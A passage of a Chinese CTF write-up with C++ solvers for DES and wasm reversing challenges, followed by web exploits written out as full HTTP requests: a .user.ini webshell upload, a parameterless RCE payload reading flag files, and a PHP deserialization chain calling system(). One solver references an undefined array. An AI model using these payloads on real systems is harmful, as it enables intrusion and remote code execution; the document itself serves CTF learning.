0x3F] |\n                 result1;\n\n        temp = *a2++ ^ ((right >> 4) | (right << 28));\n        result1 = s1[(temp >> 24) & 0x3F] |\n                  s3[(temp >> 16) & 0x3F] |\n                  s5[(temp >> 8) & 0x3F] |\n                  s7[temp & 0x3F];\n\n        temp = *a2++ ^ right;\n        left ^= s2[(temp >> 24) & 0x3F] |\n                s4[(temp >> 16) & 0x3F] |\n                s6[(temp >> 8) & 0x3F] |\n                s8[temp & 0x3F] |\n                result1;\n    }\n    left = (left >> 1) | (left << 31);\n    temp = (left ^ right) & 0xAAAAAAAA;\n    left = temp ^ left;\n    right = ((temp ^ right) >> 1) | ((temp ^ right) << 31);\n\n    temp = (left ^ (right >> 8)) & 0xFF00FF;\n    left = temp ^ left;\n    right = (temp << 8) ^ right;\n\n    temp = (left ^ (right >> 2)) & 0x33333333;\n    left = temp ^ left;\n    right = (temp << 2) ^ right;\n\n    temp = (right ^ (left >> 16)) & 0xFFFF;\n    right = temp ^ right;\n    left = (temp << 16) ^ left;\n\n    temp = (right ^ (left >> 4)) & 0x0F0F0F0F;\n\n    a1[0] = (temp << 4) ^ left;\n    a1[1] = temp ^ right;\n}\n\nint main()\n{\n    unsigned int key[64] = {\n        0x2C0B3C36, 0x09221A0A, 0x2829051D, 0x09123B0D, 0x2C091B18, 0x0512011F, 0x09292E17, 0x07122920,\n        0x090D1703, 0x0514372E, 0x0915123C, 0x27100E27, 0x01050927, 0x25150D29, 0x13151F32, 0x24112618,\n        0x03052031, 0x34312B37, 0x13043A05, 0x3C19151B, 0x23063B3E, 0x34293830, 0x03062108, 0x380B3F2A,\n        0x260E063D, 0x3009141B, 0x0E223D3D, 0x300B0124, 0x062A1700, 0x11093D14, 0x0E22262B, 0x1208083E,\n        0x0E22262B, 0x1208083E, 0x062A1700, 0x11093D14, 0x0E223D3D, 0x300B0124, 0x260E063D, 0x3009141B,\n        0x03062108, 0x380B3F2A, 0x23063B3E, 0x34293830, 0x13043A05, 0x3C19151B, 0x03052031, 0x34312B37,\n        0x13151F32, 0x24112618, 0x01050927, 0x25150D29, 0x0915123C, 0x27100E27, 0x090D1703, 0x0514372E,\n        0x09292E17, 0x07122920, 0x2C091B18, 0x0512011F, 0x2829051D, 0x09123B0D, 0x2C0B3C36, 0x09221A0A};\n\n    unsigned int data[64] = {\n        0x00000084, 0x0000008B, 0x00000003, 0x00000022, 0x00000014, 0x000000BE, 0x000000DF, 0x00000075,\n        0x000000B3, 0x000000D5, 0x00000076, 0x0000006F, 0x000000CD, 0x0000002A, 0x0000005D, 0x000000D7,\n        0x0000004D, 0x000000B2, 0x0000005F, 0x00000006, 0x00000098, 0x0000009D, 0x0000003E, 0x000000A8,\n        0x000000F7, 0x00000023, 0x000000F2, 0x0000008B, 0x000000F2, 0x00000054, 0x00000065, 0x0000007A,\n        0x00000020, 0x000000C0, 0x00000087, 0x00000055, 0x000000D6, 0x0000003B, 0x00000046, 0x0000003D,\n        0x000000F7, 0x000000B2, 0x0000007A, 0x0000009D, 0x000000C2, 0x000000CF, 0x0000001A, 0x000000AE,\n        0x00000016, 0x000000C7, 0x00000015, 0x00000030, 0x0000008E, 0x000000FD, 0x0000008F, 0x0000009E,\n        0x000000AA, 0x00000039, 0x000000AB, 0x000000FE, 0x00000095, 0x000000A7, 0x0000001F, 0x000000F1};\n\n    unsigned char Enc[64]{};\n    for (int i = 0; i < 64; i++)\n        Enc[i] = data[i];\n\n    // 四字节一组翻转\n    for (int i = 0; i < 64; i += 4)\n    {\n        auto a = Enc[i], b = Enc[i + 1], c = Enc[i + 2], d = Enc[i + 3];\n        Enc[i] = d;\n        Enc[i + 1] = c;\n        Enc[i + 2] = b;\n        Enc[i + 3] = a;\n    }\n    \n    // DES解密（用后32个key）\n    for (int i = 0; i < 64; i += 8)\n        des_encrypt((unsigned int *)(Enc + i), (DWORD *)(key + 32));\n\n    // 四字节一组翻转\n    for (int i = 0; i < 64; i += 4)\n    {\n        auto a = Enc[i], b = Enc[i + 1], c = Enc[i + 2], d = Enc[i + 3];\n        Enc[i] = d;\n        Enc[i + 1] = c;\n        Enc[i + 2] = b;\n        Enc[i + 3] = a;\n    }\n\n    printf(\"HZNUCTF{\");\n    // 逆向初始字符串变换\n    for (int i = 0; i < 64; i += 4)\n    {\n        std::string tmp1;\n        tmp1 += Enc[i];\n        tmp1 += Enc[i + 2];\n\n        std::string tmp2;\n        tmp2 += Enc[i + 1];\n        tmp2 += Enc[i + 3];\n\n        printf(\"%c\", char(std::stoi(tmp1, 0, 16)));\n        printf(\"%c\", char(std::stoi(tmp2, 0, 16)));\n    }\n\n    printf(\"}\\n\");\n\n    return 0;\n}\n```\n\nHZNUCTF{391ds2b9-9e31-45f8-ba4a-4904a2d8}\n\n### Index\n\n下载附件发现wasm文件开头字节和正常wasm文件不一样，复制修复即可。\n\n左题目附件，右正常wasm文件。\n\n![img](/images/1744633170178-32.png)\n\n使用ghidra进行分析，因为有专门的wasm反编译插件。\n\n通过Exports定位到main函数，以下是经过我重命名后的结果。\n\n![img](/images/1744633170178-33.png)\n\n首先是输入key，然后判断和该处明文是否相等。\n\n然后将Key xor上0x51。\n\n![img](/images/1744633170178-34.png)\n\n![img](/images/1744633170178-35.png)\n\n第一步加密，置了随机数种子0x194，然后用随机数打乱输入的字符串，再转存到另一个Out数组。\n\n![img](/images/1744633170178-36.png)\n\n![img](/images/1744633170179-37.png)\n\n第二步加密（四个字节一组加密）：\n\n1. 用key获取到两个值，然后全局数值iRam0001120++，每次加密都+1，初始值是0。\n2. 调用一个函数将0x10ea0处数据异或上0x10da0取下标的对应值。\n3. 再将输入字符串异或上0x10ea0对应下标数据以及0x11020对应下标数据，0x11020处数据就是原Key字符串**\"TGCTF404\"**。\n\n![img](/images/1744633170179-38.png)\n\n![img](/images/1744633170179-39.png)\n\n最后再与0x10fa0处数据进行比对，所以0x10fa0处就是加密后的flag。\n\n![img](/images/1744633170179-40.png)\n\n导出0x10ea0和0x10da0数据，编写以上代码的逆向解密代码即可。\n\n解密代码：\n\n```Cpp\n#include <iostream>\n#include <Windows.h>\n\n// 0x10da0处数据\nunsigned char box[] = {\n    0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5,\n    0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,\n    0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0,\n    0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,\n    0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc,\n    0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,\n    0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a,\n    0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,\n    0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0,\n    0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,\n    0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b,\n    0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,\n    0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85,\n    0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,\n    0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5,\n    0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,\n    0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17,\n    0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,\n    0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88,\n    0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,\n    0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c,\n    0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,\n    0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9,\n    0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,\n    0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6,\n    0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,\n    0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e,\n    0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,\n    0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94,\n    0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,\n    0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68,\n    0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16};\n    \n// 0x10ea0处数据\nunsigned char box_ori[] = {\n    0xd6, 0x90, 0xe9, 0xfe, 0xcc, 0xe1, 0x3d, 0xb7, 0x16, 0xb6, 0x14, 0xc2, 0x28, 0xfb, 0x2c, 0x05,\n    0x2b, 0x67, 0x9a, 0x76, 0x2a, 0xbe, 0x04, 0xc3, 0xaa, 0x44, 0x13, 0x26, 0x49, 0x86, 0x06, 0x99,\n    0x9c, 0x42, 0x50, 0xf4, 0x91, 0xef, 0x98, 0x7a, 0x33, 0x54, 0x0b, 0x43, 0xed, 0xcf, 0xac, 0x62,\n    0xe4, 0xb3, 0x1c, 0xa9, 0xc9, 0x08, 0xe8, 0x95, 0x80, 0xdf, 0x94, 0xfa, 0x75, 0x8f, 0x3f, 0xa6,\n    0x47, 0x07, 0xa7, 0xfc, 0xf3, 0x73, 0x17, 0xba, 0x83, 0x59, 0x3c, 0x19, 0xe6, 0x85, 0x4f, 0xa8,\n    0x68, 0x6b, 0x81, 0xb2, 0x71, 0x64, 0xda, 0x8b, 0xf8, 0xeb, 0x0f, 0x4b, 0x70, 0x56, 0x9d, 0x35,\n    0x1e, 0x24, 0x0e, 0x5e, 0x63, 0x58, 0xd1, 0xa2, 0x25, 0x22, 0x7c, 0x3b, 0x01, 0x21, 0x78, 0x87,\n    0xd4, 0x00, 0x46, 0x57, 0x9f, 0xd3, 0x27, 0x52, 0x4c, 0x36, 0x02, 0xe7, 0xa0, 0xc4, 0xc8, 0x9e,\n    0xea, 0xbf, 0x8a, 0xd2, 0x40, 0xc7, 0x38, 0xb5, 0xa3, 0xf7, 0xf2, 0xce, 0xf9, 0x61, 0x15, 0xa1,\n    0xe0, 0xae, 0x5d, 0xa4, 0x9b, 0x34, 0x1a, 0x55, 0xad, 0x93, 0x32, 0x30, 0xf5, 0x8c, 0xb1, 0xe3,\n    0x1d, 0xf6, 0xe2, 0x2e, 0x82, 0x66, 0xca, 0x60, 0xc0, 0x29, 0x23, 0xab, 0x0d, 0x53, 0x4e, 0x6f,\n    0xd5, 0xdb, 0x37, 0x45, 0xde, 0xfd, 0x8e, 0x2f, 0x03, 0xff, 0x6a, 0x72, 0x6d, 0x6c, 0x5b, 0x51,\n    0x8d, 0x1b, 0xaf, 0x92, 0xbb, 0xdd, 0xbc, 0x7f, 0x11, 0xd9, 0x5c, 0x41, 0x1f, 0x10, 0x5a, 0xd8,\n    0x0a, 0xc1, 0x31, 0x88, 0xa5, 0xcd, 0x7b, 0xbd, 0x2d, 0x74, 0xd0, 0x12, 0xb8, 0xe5, 0xb4, 0xb0,\n    0x89, 0x69, 0x97, 0x4a, 0x0c, 0x96, 0x77, 0x7e, 0x65, 0xb9, 0xf1, 0x09, 0xc5, 0x6e, 0xc6, 0x84,\n    0x18, 0xf0, 0x7d, 0xec, 0x3a, 0xdc, 0x4d, 0x20, 0x79, 0xee, 0x5f, 0x3e, 0xd7, 0xcb, 0x39, 0x48};\n    \nvoid unnamed_function_10(byte *param1, int param2)\n{\n    for (int i = 0; i < 0x100; i = i + 1)\n    {\n        param1[i] = param1[i] ^ (byte)param2;\n    }\n    return;\n}\n\nunsigned char Enc[] = {\n    0x84, 0x00, 0x00, 0x00,\n    0x1c, 0x00, 0x00, 0x00,\n    0x6b, 0x00, 0x00, 0x00,\n    0xf7, 0x00, 0x00, 0x00,\n    0x49, 0x00, 0x00, 0x00,\n    0x22, 0x00, 0x00, 0x00,\n    0xd6, 0x00, 0x00, 0x00,\n    0x42, 0x00, 0x00, 0x00,\n    0x50, 0x00, 0x00, 0x00,\n    0x7b, 0x00, 0x00, 0x00,\n    0x42, 0x00, 0x00, 0x00,\n    0xf4, 0x00, 0x00, 0x00,\n    0x46, 0x00, 0x00, 0x00,\n    0xa9, 0x00, 0x00, 0x00,\n    0x83, 0x00, 0x00, 0x00,\n    0x62, 0x00, 0x00, 0x00,\n    0xd1, 0x00, 0x00, 0x00,\n    0x32, 0x00, 0x00, 0x00,\n    0x80, 0x00, 0x00, 0x00,\n    0x42, 0x00, 0x00, 0x00,\n    0x6a, 0x00, 0x00, 0x00,\n    0x10, 0x00, 0x00, 0x00,\n    0xa3, 0x00, 0x00, 0x00,\n    0xf2, 0x00, 0x00, 0x00,\n    0xe2, 0x00, 0x00, 0x00,\n    0xb8, 0x00, 0x00, 0x00,\n    0x0b, 0x00, 0x00, 0x00,\n    0x76, 0x00, 0x00, 0x00,\n    0xb0, 0x00, 0x00, 0x00,\n    0xdc, 0x00, 0x00, 0x00,\n    0x02, 0x00, 0x00, 0x00,\n    0x51, 0x00, 0x00, 0x00};\n\nvoid Dec_2(unsigned char *Input, unsigned char *Key)\n{\n    static int c = 0;\n    int iVar1 = (int)Key[c] >> 4;\n    DWORD uVar2 = (int)Key[c] & 0xf;\n    c++;\n    unnamed_function_10(box_ori, (int)*(char *)(iVar1 * 0x10 + (unsigned char *)box + uVar2));\n    unsigned char key_o[] = \"TGCTF404\";\n    for (int i = 0; i < 4; i++)\n    {\n        Input[i] = Input[i] ^ box_ori2[iVar1 * 0x10 + i * 0x11 + uVar2];\n        Input[i] = Input[i] ^ key_o[i];\n    }\n}\n\nvoid decrypt(unsigned char *Input, int length)\n{\n    unsigned char Key[] = \"TGCTF404\";\n\n    for (int i = 0; i < 8; i++)\n        Key[i] ^= 0x51;\n\n    for (int i = 0; i < length; i += 4)\n    {\n        Dec_2((unsigned char *)(Input + i), Key);\n    }\n\n    srand(0x194);\n\n    int swaps[32][2];\n    for (int i = 0; i < 32; i++)\n    {\n        auto Value = rand();\n        Value = i + Value / (0x7fff / (32 - i) + 1);\n        swaps[i][0] = i;\n        swaps[i][1] = Value;\n    }\n\n    for (int i = 31; i >= 0; i--)\n    {\n        unsigned char temp = Input[swaps[i][0]];\n        Input[swaps[i][0]] = Input[swaps[i][1]];\n        Input[swaps[i][1]] = temp;\n    }\n}\n\nint main()\n{\n    unsigned char Key[] = \"TGCTF404\";\n    unsigned char Enc_flag[32]{};\n    \n    for (int i = 0; i < 32; i++)\n        Enc_flag[i] = *(int *)((byte *)Enc + i * 4);\n\n    decrypt(Enc_flag, 32);\n\n    printf(\"%.32s\\n\", Enc_flag);\n    return 0;\n}\n```\n\nHZNUCTF{f898-de85-46e-9e43-b9c8}\n\n## Web\n\n### (ez)upload\n\n扫目录 有 upload.php.bak 翻源码。name处存在穿越。\n\n可以上传.user.ini。而只有上级目录有php文件可以触发。\n\n因此。我们传图片马和.user.ini到上级目录。等待触发即可。\n\npayload：\n\n```http\nPOST /upload.php?name=../evil.png HTTP/1.1\nHost: node1.tgctf.woooo.tech:32690\nContent-Length: 320\nCache-Control: max-age=0\nAccept-Language: zh-CN,zh;q=0.9\nOrigin: http://node1.tgctf.woooo.tech:32690\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundary76S3hC5Gh3B7j6KZ\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nReferer: http://node1.tgctf.woooo.tech:32690/\nAccept-Encoding: gzip, deflate, br\nConnection: keep-alive\n\n------WebKitFormBoundary76S3hC5Gh3B7j6KZ\nContent-Disposition: form-data; name=\"name\"; filename=\"1.png\"\nContent-Type: application/octet-stream\n\n<?php phpinfo();?>\n\n\n------WebKitFormBoundary76S3hC5Gh3B7j6KZ\nContent-Disposition: form-data; name=\"submit\"\n\n上传文件\n------WebKitFormBoundary76S3hC5Gh3B7j6KZ--\nPOST /upload.php?name=../.user.ini HTTP/1.1\nHost: node1.tgctf.woooo.tech:32690\nContent-Length: 335\nCache-Control: max-age=0\nAccept-Language: zh-CN,zh;q=0.9\nOrigin: http://node1.tgctf.woooo.tech:32690\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundary76S3hC5Gh3B7j6KZ\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nReferer: http://node1.tgctf.woooo.tech:32690/\nAccept-Encoding: gzip, deflate, br\nConnection: keep-alive\n\n------WebKitFormBoundary76S3hC5Gh3B7j6KZ\nContent-Disposition: form-data; name=\"name\"; filename=\".user.ini\"\nContent-Type: application/octet-stream\n\nauto_prepend_file=evil.png\n\n------WebKitFormBoundary76S3hC5Gh3B7j6KZ\nContent-Disposition: form-data; name=\"submit\"\n\n上传文件\n------WebKitFormBoundary76S3hC5Gh3B7j6KZ--\n```\n\n在phpinfo的$_SERVER['FLAG']里看到flag\n\n### AAA偷渡阴平\n\n无参数RCE绕过。\n\npayload：\n\n```http\nGET /?tgctf2025=eval(end(current(get_defined_vars())));&b=system('cat /f*'); HTTP/1.1\nHost: node1.tgctf.woooo.tech:30815\nAccept-Language: zh-CN,zh;q=0.9\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nCUIASDGHFIOUWE: 123123\nAccept-Encoding: gzip, deflate, br\nConnection: keep-alive\n```\n\n### 什么文件上传？\n\nrobots.txt 进去有 class.php 一眼就能瞪出来pop链子。\n\n```php\n<?php\nhighlight_file(__FILE__);\nerror_reporting(0);\n\nclass yesterday {\n    public $learn;\n    public $study=\"study\";\n    public $try;\n    public function __construct()\n    {\n        $this->learn = \"learn<br>\";\n    }\n    public function __destruct()\n    {\n        echo \"You studied hard yesterday.<br>\";\n        return $this->study->hard();\n    }\n}\nclass today {\n    public $doing;\n    public $did;\n    public $done;\n    public function __construct(){\n        $this->did = \"What you did makes you outstanding.<br>\";\n    }\n    public function __call($arg1, $arg2)\n    {\n        $this->done = \"And what you've done has given you a choice.<br>\";\n        echo $this->done;\n        if(md5(md5($this->doing))==666){\n            return $this->doing();\n        }\n        else{\n            return $this->doing->better;\n        }\n    }\n}\nclass tommoraw {\n    public $good;\n    public $bad;\n    public $soso;\n    public function __invoke(){\n        $this->good=\"You'll be good tommoraw!<br>\";\n        echo $this->good;\n    }\n    public function __get($arg1){\n        $this->bad=\"You'll be bad tommoraw!<br>\";\n    }\n\n}\nclass future{\n    private $impossible=\"How can you get here?<br>\";\n    private $out;\n    private $no;\n    public $useful1;public $useful2;public $useful3;public $useful4;public $useful5;public $useful6;public $useful7;public $useful8;public $useful9;public $useful10;public $useful11;public $useful12;public $useful13;public $useful14;public $useful15;public $useful16;public $useful17;public $useful18;public $useful19;public $useful20;\n\n    public function __set($arg1, $arg2) {\n        if ($this->out->useful7) {\n            echo \"Seven is my lucky number<br>\";\n            system('whoami');\n        }\n    }\n    public function __toString(){\n        echo \"This is your future.<br>\";\n        system($_POST[\"wow\"]);\n        return \"win\";\n    }\n    public function __destruct(){\n        $this->no = \"no\";\n        return $this->no;\n    }\n}\n$evil = new yesterday();\n$evil -> study = new today();\n$evil -> study -> doing = new future();\n```\n\n随后序列化evil。base64四次。随后上传文件通过file_exists的检查即可。\n\n```http\nPOST /upload.php HTTP/1.1\nHost: node1.tgctf.woooo.tech:32439\nContent-Length: 5437\nCache-Control: max-age=0\nAccept-Language: zh-CN,zh;q=0.9\nOrigin: http://node1.tgctf.woooo.tech:32439\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryurqPJUpE3whNwI5B\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nReferer: http://node1.tgctf.woooo.tech:32439/\nAccept-Encoding: gzip, deflate, br\nConnection: keep-alive\n\n------WebKitFormBoundaryurqPJUpE3whNwI5B\nContent-Disposition: form-data; name=\"Vm10b2QyUnJOVlpQV0VKVVlXeGFhRll3VlRCa01XUnpZVVYwYUUxWGVGcFpWRXB6VlVkR2NrMUVTbUZXUlRWUFZHMXpNVlpYU1hsaVIyeFRUVlp3ZGxkVVNYZE5SMFpXVDBod1ZWWkdjRkZXYTJNMVkwWnNjbHBHWkdoU01EVXdWR3RTYjFkdFNuSmhNMHBVVmpOQmQxcFhjelZqVmxwVlYydHdhV0Y2VWpOWGExcHJWVEExVm1KSVJtdFNhMHBSV1ZkNFZrMXNUbGhPVms1cllraENTVlZ0Y0ZkVGJVWjBUMVJhVlUxcVZYZGFWM00xWTFaYVZWZHJjR2xXYTI5NVYxWmFhazFYU25KaVNFWnJVbXRLVVZsWGVISk5iRTVZVFZkR1RsWXhTa3BXYlRWeldWWlZkMkY2U2xWV00wSlBWRzB4Vm1Wc1VsVlhhelZYVWpKTmVWVXhaR3RSTWtwWVZXeHNWbUZyV25GWmJGcFhVV3hzVjFremFHdE5hMncyVmtjMWQyRkdXWGRqU0hCWVlrVTFTMVJxU2s5T2JVbDZZa1U1VjFKNmJIZFdWRUpxVGxVd2QySkZhRlZpVjJod1dWWldTazFXYkhGVWJGcGhUVmM1TlZadGNFTlRiRWw1WVVoT1drMXFSbGRVUkVaRFUwWk9kV0pHUm1oV1YzTjZWMVJPZDJSdFZrWk5WbFpwVFcxNFExVnFSblpsUm5CR1lVWmtiRlp1UWxOVlZ6VmhZVEZrUjFKdVFsVmxhMFYzVkdwS1QwNXRTWHBoUlRWVFVucHNkMVZXVm10WlZURllWV3RzVjJKdGVHaFdWbFpMVFZac2RXSkZjRTlOVmtwNFdrVm9kMVZIUm5SVVZFcFVWbnBXV0ZwWGVIZFhSbVJ4VW0xc1UxSldXbmRXU0hCQ1RVVTBlVlJxV21sbGF6VlJXVlpXZG1WR2JEWlRiR1JwVmpGS1dWcEVUbk5UYlVaMVZXeENWV1ZyTlU5VWJYTXhUbTFKZVdKSGRGaFNWRlo2VmpJd01WWXlUWGROVkZaVVZrZFNWbGxYTlZOT2JGRjVZMGR3VDJFeWVERldiVFYzV1ZaWmVHSXphRnBoTVVwVFdWWlZOR1F3TlVWYVIzQnNZbFJvTmxaRVNuTlRNREZZVkZoc1YySlVSbkpXYWs1cVpVWk9XR05FUWxWTlJHZzJWa1pTWVZReVZuUlBXRUpoVW0xb1VGbHJXbmRrVmxwMVZHczVhRlpYYzNwV2EyUjNUVWRXY2s5WVJscGxiSEJMV1cxNFlVNXNaSE5hUjBaT1ZqQndSbGRVU25OVlJURkZWVlJPV2swelFqSlVWRUUxWTBaT2NWSnRjRTVpUm5Bd1YydGFhMDB3TlVaaVNFWnJVbFJzVVZSVVFYZE5iRkoxWTBoYWFGWXhTbHBXUnpFMFdWZEtjMWR1Y0ZWTlZUVkxWR3BHVTJOWFVrbGpSa0pvWWxkTmVWVXhZekZXTWxaelkwWm9XR0ZyV25CVmExWlhUVEZPV0dORVFsVk5SR2cyVmtaU1lWVkdTa2hQV0VKaFVtMW9VRmxyV25ka1ZscDFWR3MxVjFKV1duZFdTSEJDVFVVMGVWUnFXbWxsYkVwUldWWldkbVZHYkRaVGJHUnBWakZLV1ZwRVRtOVViVVpXWVhwT1YxSXpRWGRhVjNNMVkxWndObGRyY0dsaVJtOHlWako0YTFsVk1WaFRhMVpUVjBoQ1MxbFhOVk5WUmxJMlZHczFUMkY2YkVaWmFrcHpZVEZrUms1WVRsaGlWRlpZV1hwQmVGWldWbGhpUmtKT1VrWkZlbGRVVG5ka2F6VkdUMWhDVkdGclduRlVWM2hoWkVad1IxcEVUbXhTVkZaVlZURlNhMVpYUm5WVmFscFZUVzVDZFZSdGRITmtWbHAxWTBkR1YwMVhPVFJYVjNSVFVtc3hjbUpJUm10U1ZHeFJWRlJCZDAxc1VYZFZibHBvVmpGS1dsWkhNVFJaVjBwelYyNXdWVlpzU25GWlZsVTBaREExUlZwSGNHeGlWR2QzVmtSS2MxTXdNVmhVV0d4WFlsUkdjbFpxVG10T1JsRjNWR3R3VDAxV1NuaGFSV2gzVlVkR2RGbDZTbFJXZWxaWVdsZDRkMWRHWkhGU2JXeFRVbFpWZUZVeFpIZE5SbEYzVDBod1ZWWkdjRkZWYTJNMVkwWndSMkZGT1dsU2JrSXhWbTAxVDFSdFJuSlNia0pWWld0RmQxUnFTbUZYVmxKVlYyczFiR0pVYkhkV01uUnJZekpGZDJKSVJtdFRTRUpSV1ZkemQwMVdVWGxpUlhSWVVqQmFTVlZ0Y0VOVGJFNUlaVVJLWVZKck5VUlpWRXBIVjBaV1dGcEhiRmROUm5BMVZqSjRiMVJzYjNsV2JHaFFWa1ZhUzFWdWNISmxSbkJHWVVVNVRsSnRlRmxVYkdRd1lVWmFObFp1VmxWU00wRXdXVlprVDJOVk5VaGlSa0pPVFVSQmVWWkhkRk5rYlVaWFkwVm9VRmRHV21oV1ZFSnlUVEZhU0dORVFsQldNRFF5V1dwT2QxVkhSbFppTTJSYVRXcFdlVmxXVlRSa01EVkZXa2N4VmxaRVFUVT0=.txt\"; filename=\"Vm10b2QyUnJOVlpQV0VKVVlXeGFhRll3VlRCa01XUnpZVVYwYUUxWGVGcFpWRXB6VlVkR2NrMUVTbUZXUlRWUFZHMXpNVlpYU1hsaVIyeFRUVlp3ZGxkVVNYZE5SMFpXVDBod1ZWWkdjRkZXYTJNMVkwWnNjbHBHWkdoU01EVXdWR3RTYjFkdFNuSmhNMHBVVmpOQmQxcFhjelZqVmxwVlYydHdhV0Y2VWpOWGExcHJWVEExVm1KSVJtdFNhMHBSV1ZkNFZrMXNUbGhPVms1cllraENTVlZ0Y0ZkVGJVWjBUMVJhVlUxcVZYZGFWM00xWTFaYVZWZHJjR2xXYTI5NVYxWmFhazFYU25KaVNFWnJVbXRLVVZsWGVISk5iRTVZVFZkR1RsWXhTa3BXYlRWeldWWlZkMkY2U2xWV00wSlBWRzB4Vm1Wc1VsVlhhelZYVWpKTmVWVXhaR3RSTWtwWVZXeHNWbUZyV25GWmJGcFhVV3hzVjFremFHdE5hMncyVmtjMWQyRkdXWGRqU0hCWVlrVTFTMVJxU2s5T2JVbDZZa1U1VjFKNmJIZFdWRUpxVGxVd2QySkZhRlZpVjJod1dWWldTazFXYkhGVWJGcGhUVmM1TlZadGNFTlRiRWw1WVVoT1drMXFSbGRVUkVaRFUwWk9kV0pHUm1oV1YzTjZWMVJPZDJSdFZrWk5WbFpwVFcxNFExVnFSblpsUm5CR1lVWmtiRlp1UWxOVlZ6VmhZVEZrUjFKdVFsVmxhMFYzVkdwS1QwNXRTWHBoUlRWVFVucHNkMVZXVm10WlZURllWV3RzVjJKdGVHaFdWbFpMVFZac2RXSkZjRTlOVmtwNFdrVm9kMVZIUm5SVVZFcFVWbnBXV0ZwWGVIZFhSbVJ4VW0xc1UxSldXbmRXU0hCQ1RVVTBlVlJxV21sbGF6VlJXVlpXZG1WR2JEWlRiR1JwVmpGS1dWcEVUbk5UYlVaMVZXeENWV1ZyTlU5VWJYTXhUbTFKZVdKSGRGaFNWRlo2VmpJd01WWXlUWGROVkZaVVZrZFNWbGxYTlZOT2JGRjVZMGR3VDJFeWVERldiVFYzV1ZaWmVHSXphRnBoTVVwVFdWWlZOR1F3TlVWYVIzQnNZbFJvTmxaRVNuTlRNREZZVkZoc1YySlVSbkpXYWs1cVpVWk9XR05FUWxWTlJHZzJWa1pTWVZReVZuUlBXRUpoVW0xb1VGbHJXbmRrVmxwMVZHczVhRlpYYzNwV2EyUjNUVWRXY2s5WVJscGxiSEJMV1cxNFlVNXNaSE5hUjBaT1ZqQndSbGRVU25OVlJURkZWVlJPV2swelFqSlVWRUUxWTBaT2NWSnRjRTVpUm5Bd1YydGFhMDB3TlVaaVNFWnJVbFJzVVZSVVFYZE5iRkoxWTBoYWFGWXhTbHBXUnpFMFdWZEtjMWR1Y0ZWTlZUVkxWR3BHVTJOWFVrbGpSa0pvWWxkTmVWVXhZekZXTWxaelkwWm9XR0ZyV25CVmExWlhUVEZPV0dORVFsVk5SR2cyVmtaU1lWVkdTa2hQV0VKaFVtMW9VRmxyV25ka1ZscDFWR3MxVjFKV1duZFdTSEJDVFVVMGVWUnFXbWxsYkVwUldWWldkbVZHYkRaVGJHUnBWakZLV1ZwRVRtOVViVVpXW